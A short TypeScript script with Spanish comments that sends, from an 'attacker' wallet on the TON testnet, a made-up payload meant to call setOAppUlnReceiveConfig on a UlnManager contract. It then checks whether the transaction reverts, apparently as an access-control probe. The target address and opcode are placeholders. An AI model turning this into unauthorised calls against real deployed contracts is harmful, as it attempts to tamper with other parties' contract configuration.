import { TonClient, WalletContractV4, internal } from "@ton/ton";
import { mnemonicToPrivateKey } from "@ton/crypto";

(async () => {
    const client = new TonClient({
        endpoint: "https://testnet.toncenter.com/api/v2/jsonRPC",
    });

    // Mnemonic del atacante (usa cualquiera)
    const seed = "test test test test test test test test test test test junk";

    const key = await mnemonicToPrivateKey(seed.split(" "));

    const attackerWallet = WalletContractV4.create({
        publicKey: key.publicKey,
        workchain: 0,
    });

    const provider = client.provider(attackerWallet.address);

    console.log("Attacker wallet:", attackerWallet.address.toString());

    // Obtener seqno
    const seqno = await attackerWallet.getSeqno(provider);

    // Dirección del UlnManager
    const managerAddress = "EQD00000000000000000000000000000000000000000000000000000000000";  

    // Payload falso — OP de setOAppUlnReceiveConfig
    const bogusPayload = Buffer.from([
        0x00, 0x00, 0x00, 0x10, // OP code (ejemplo)
        0x00, 0x00, 0x00, 0x02, // dstEid: 2
        0x01, 0x02, 0x03, 0x04  // payload arbitrario
    ]);

    try {
        console.log("Enviando transacción sospechosa...");

        await attackerWallet.sendTransfer(provider, {
            seqno,
            secretKey: key.secretKey,
            messages: [
                internal({
                    to: managerAddress,
                    value: "0.05", 
                    body: bogusPayload
                })
            ]
        });

        console.log("Transacción ENVIADA. Verifica en explorer si revirtió.");

    } catch (err: any) {
        console.log("La transacción fue revertida.");
        console.log("Motivo:", err.message);
    }

})();
